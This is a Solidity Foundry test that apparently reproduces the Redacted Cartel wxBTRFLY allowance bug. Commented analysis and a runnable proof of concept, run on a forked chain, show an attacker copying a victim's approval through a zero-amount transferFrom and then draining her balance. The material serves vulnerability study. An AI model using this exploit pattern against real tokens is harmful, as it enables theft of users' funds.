// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

/*
Redacted Cartel Custom Approval Logic Exploit PoC

The vulnerability would have allowed a malicious attacker to assign a user’s allowance to themselves, enabling the attacker to steal that user’s funds.

a faulty implementation of standard transferFrom() ERC-20 function in wxBTRFLY token.
*/

// VULNERABILITY: Incorrect spender in custom transferFrom allowance update
// Root cause: In wxBTRFLY (deployed at 0x186E55C0BebD2f69348d94C4A27556d93C5Bd36C), the FrozenToken contract
// overrides ERC20.transferFrom with a buggy version:
//     function transferFrom(address sender, address recipient, uint256 amount) public virtual override onlyAuthorisedOperators returns (bool) {
//         _transfer(sender, recipient, amount);
//         _approve(sender, msg.sender, allowance(sender, recipient ).sub(amount, "ERC20: transfer amount exceeds allowance"));
//         return true;
//     }
// The second argument to allowance() is `recipient` (the `to` param) instead of `msg.sender` (the actual spender in the call).
// This is a copy-paste error confusing the standard ERC20.transferFrom logic (which correctly does allowance deduction for msg.sender).
// _approve(sender, msg.sender, X) then GRANTS/OVERWRITES an allowance FROM sender TO the CALLER (msg.sender) equal to
// the (previously granted) allowance(sender, recipient) minus amount.
// Why vulnerable: ERC20 allowance is mapping[owner][spender]. By choosing a `recipient` that Alice previously
// approved (AliceContract), any caller (Bob) can force Alice's allowance[Alice][Bob] = allowance(Alice, AliceContract).
// The onlyAuthorisedOperators modifier (which gates on !isTokenFrozen || isAuthorisedOperators[msg.sender]) is
// bypassed in PoC via owner.unFreezeToken() which sets isTokenFrozen=false (see setUp + testExploit line ~34).
// Impact: Attacker can hijack any approval and drain the sender's entire wxBTRFLY balance. Breaks ERC20 security model for approvals.

contract RedactedCartelExploit is Test {
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    IRedactedCartelSafeERC20 wxBTRFLY = IRedactedCartelSafeERC20(0x186E55C0BebD2f69348d94C4A27556d93C5Bd36C);

    address Alice = 0x9ee1873ba8383B1D4ac459aBd3c9C006Eaa8800A;
    address AliceContract = 0x0f41d34B301E24E549b7445B3f620178bff331be;
    address Bob = 0x78186702Bd66905845B469E3b76d4FD63F8722d4;
    address owner = 0x20B92862dcb9976E0AA11fAE766343B7317aB349; //owner of wxBTRFLY token

    function setUp() public {
        cheats.createSelectFork("http://127.0.0.1:8545", 13_908_185); //13908185

        // cheat.label(address(Alice), "Alice");
        // cheat.label(address(AliceContract), "AliceContract");
        // cheat.label(address(Bob), "Bob");
        // cheat.label(address(owner), "wxBTRFLYOwner");
    }

    function testExploit() public {
        // VULNERABILITY: [as documented above at contract level]
        // EXPLOIT STEPS:
        // 1. Bypass freeze modifier: cheats.prank(owner); wxBTRFLY.unFreezeToken(); (calls FrozenToken.unFreezeToken which sets isTokenFrozen=false; see wxBTRFLY owner at L19 in this file, and modifier at contract source)
        //    This makes onlyAuthorisedOperators pass for anyone (since !isTokenFrozen).
        // 2. Victim Alice grants approval: cheats.prank(Alice); wxBTRFLY.approve(AliceContract, AMOUNT); (L~45)
        //    This sets _allowances[Alice][AliceContract] = AMOUNT (standard approve in ERC20).
        //    At this point allowance(Alice, Bob) == 0.
        // 3. Attacker (Bob) triggers the flawed transferFrom with zero amount targeting the approved recipient:
        //    cheats.prank(Bob); wxBTRFLY.transferFrom(Alice, AliceContract, 0); (L~63)
        //    Inside buggy transferFrom (L52-55 in comment):
        //      - _transfer(Alice, AliceContract, 0) — no-op, balance unchanged (since amount=0)
        //      - _approve(Alice, Bob /*msg.sender*/, allowance(Alice, AliceContract /*WRONG param*/).sub(0) )
        //      => this sets _allowances[Alice][Bob] = _allowances[Alice][AliceContract]  (the victim's approval is copied to attacker)
        // 4. Attacker drains: cheats.prank(Bob); wxBTRFLY.transferFrom(Alice, Bob, AMOUNT); (L~69)
        //    Now the caller's allowance check passes because Bob has the stolen allowance, _transfer moves tokens to Bob.
        //    Alice ends up with 0, Bob steals the full balance.
        //
        // Why amount=0 is key: sub(0) doesn't reduce the copied value; transfer amount=0 is allowed by ERC20 and doesn't revert.
        // The bug exists because the override replaced the correct `msg.sender` (spender) with `recipient` in the allowance() lookup.

        //quick hack to bypass the "onlyAuthorisedOperators" modifier
        cheats.prank(owner);
        wxBTRFLY.unFreezeToken();

        console.log("Before the Exploit !");
        console.log("Alice wxBTRFLY Token Balance: ", wxBTRFLY.balanceOf(Alice));
        console.log("Bob wxBTRFLY Token Balance: ", wxBTRFLY.balanceOf(Bob));
        console.log("--------------------------------------------------");

        // Step 1: Alice approves an address to spend wxBTRFLY Token on her behalf
        cheats.prank(Alice);
        wxBTRFLY.approve(AliceContract, 89_011_248_549_237_373_700); // wxBTRFLY.balanceOf(Alice)
        console.log("wxBTRFLY Allowance of Alice->AliceContract : ", wxBTRFLY.allowance(Alice, AliceContract));
        console.log("wxBTRFLY Allowance of Alice->Bob(Before transferFrom): ", wxBTRFLY.allowance(Alice, Bob));

        /*
            Custom vulnerable transferFrom function of wxBTRFLY token

             function transferFrom(address sender, address recipient, uint256 amount) public virtual override onlyAuthorisedOperators returns (bool) {
                _transfer(sender, recipient, amount);
                _approve(sender, msg.sender, allowance(sender, recipient ).sub(amount, "ERC20: transfer amount exceeds allowance"));
                return true;
            }
        */

        // Step 2: Bob calls wxBTRFLY.transferFrom(Alice, aliceContract, 0),
        // No transfer happens, but due to the allowance bug, Bob gets an allowance for Alice’s money
        cheats.prank(Bob);
        //_approve(Alice, Bob, allowance(Alice, AliceContract ).sub(0)
        wxBTRFLY.transferFrom(Alice, AliceContract, 0);
        console.log("wxBTRFLY Allowance of Alice->Bob(After transferFrom): ", wxBTRFLY.allowance(Alice, Bob));

        //post-hack
        cheats.prank(Bob);
        wxBTRFLY.transferFrom(Alice, Bob, 89_011_248_549_237_373_700); // wxBTRFLY.balanceOf(Alice)

        console.log("--------------------------------------------------");
        console.log("After the Exploit !");
        console.log("Alice wxBTRFLY Token Balance: ", wxBTRFLY.balanceOf(Alice));
        console.log("Bob wxBTRFLY Token Balance: ", wxBTRFLY.balanceOf(Bob));
    }
}
